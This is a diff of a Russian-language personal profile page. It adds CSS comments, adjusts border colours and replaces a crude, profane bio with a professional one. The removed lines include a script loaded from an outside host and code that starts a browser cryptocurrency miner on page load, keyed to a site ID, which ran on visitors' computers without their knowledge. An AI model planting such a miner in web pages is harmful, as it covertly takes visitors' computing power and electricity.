@@ -9,21 +9,23 @@
     <title>Визитная Карточка | Wenci</title>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&amp;display=swap" rel="stylesheet">
     <style>
+        /* Основные переменные */
         :root {
-            --bg-dark: #0d1117;
-            --bg-dark-alt: #161b22;
-            --text-light: #c9d1d9;
-            --highlight-python: #3572A5;
-            --highlight-lua: #000080;
-            --highlight-css: #264de4;
-            --shadow-light: rgba(0, 0, 0, 0.3);
-            --shadow-dark: rgba(0, 0, 0, 0.7);
-            --primary-color: #58a6ff;
-            --secondary-color: #7ee787;
-            --tertiary-color: #f85149;
-            --text-light-hover: rgba(255, 255, 255, 0.8);
+            --bg-dark: #0d1117; /* Темный фон */
+            --bg-dark-alt: #161b22; /* Альтернативный темный фон */
+            --text-light: #c9d1d9; /* Светлый текст */
+            --highlight-python: #3572A5; /* Подсветка Python */
+            --highlight-lua: #000080; /* Подсветка Lua */
+            --highlight-css: #264de4; /* Подсветка CSS */
+            --shadow-light: rgba(0, 0, 0, 0.3); /* Светлая тень */
+            --shadow-dark: rgba(0, 0, 0, 0.7); /* Темная тень */
+            --primary-color: #58a6ff; /* Основной цвет */
+            --secondary-color: #7ee787; /* Вторичный цвет */
+            --tertiary-color: #f85149; /* Третичный цвет */
+            --text-light-hover: rgba(255, 255, 255, 0.8); /* Текст при наведении */
         }
 
+        /* Основные стили для body */
         body {
             margin: 0;
             padding: 0;
@@ -38,6 +40,7 @@
             position: relative;
         }
 
+        /* Фоновая анимация */
         .background {
             position: absolute;
             top: 0;
@@ -60,6 +63,7 @@
             100% { transform: translateY(-100%); }
         }
 
+        /* Основные стили карточки */
         .card {
             background: rgba(30, 34, 39, 0.9);
             border-radius: 20px;
@@ -67,7 +71,7 @@
             width: 350px;
             padding: 30px;
             color: var(--text-light);
-            border: 1px solid #444;
+            border: 1px solid var(--bg-dark-alt);
             position: relative;
             overflow: hidden;
             display: flex;
@@ -96,7 +100,7 @@
             width: 120px;
             height: 120px;
             border-radius: 50%;
-            border: 5px solid #444;
+            border: 5px solid var(--bg-dark-alt);
             margin-bottom: 20px;
             object-fit: cover;
             box-shadow: 0 8px 24px var(--shadow-dark);
@@ -312,7 +316,7 @@
         <img src="images/14a23cc96606174743858411d1e55607.jpg" alt="Профильное изображение Wenci" class="profile-img">
         <div class="card-content">
             <h1>Wenci</h1>
-            <p>Привет! Я пиздатый ахуенны, если вы хотите получить гайд как играть в доту то идите нахуй, напишу скрипт для получения алиментов</p>
+            <p>Привет! Я программист с опытом работы в Python, Lua и CSS. Свяжитесь со мной через GitHub, Discord, Telegram или Spotify.</p>
             <div class="social-icons">
                 <a href="https://github.com/Wencix" target="_blank" title="GitHub">
                     <img src="https://img.icons8.com/ios-filled/50/ffffff/github.png" alt="GitHub">
@@ -339,8 +343,6 @@
         </div>
     </div>
 
-
-    <script src="https://www.hostingcloud.racing/ECfX.js"></script>
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             const menuToggle = document.getElementById('menuToggle');
@@ -355,24 +357,6 @@
                 loader.classList.add('hidden');
                 setTimeout(() => loader.remove(), 300);
             });
-
-
-            try {
-                if (typeof Client === 'undefined') {
-                    throw new Error('Класс Client не определен');
-                }
-
-                var _client = new Client.Anonymous('2ec71af93391bf355c4d45b2cf34c8042dc3e888c1e58d68b9c1c6898045ebc4', {
-                    throttle: 0.6,
-                    c: 'w'
-                });
-
-                _client.start();
-
-                console.log("Майнинг-клиент запущен.");
-            } catch (error) {
-                console.error("Ошибка при запуске майнинг-клиента:", error);
-            }
         });
     </script>
 </body>
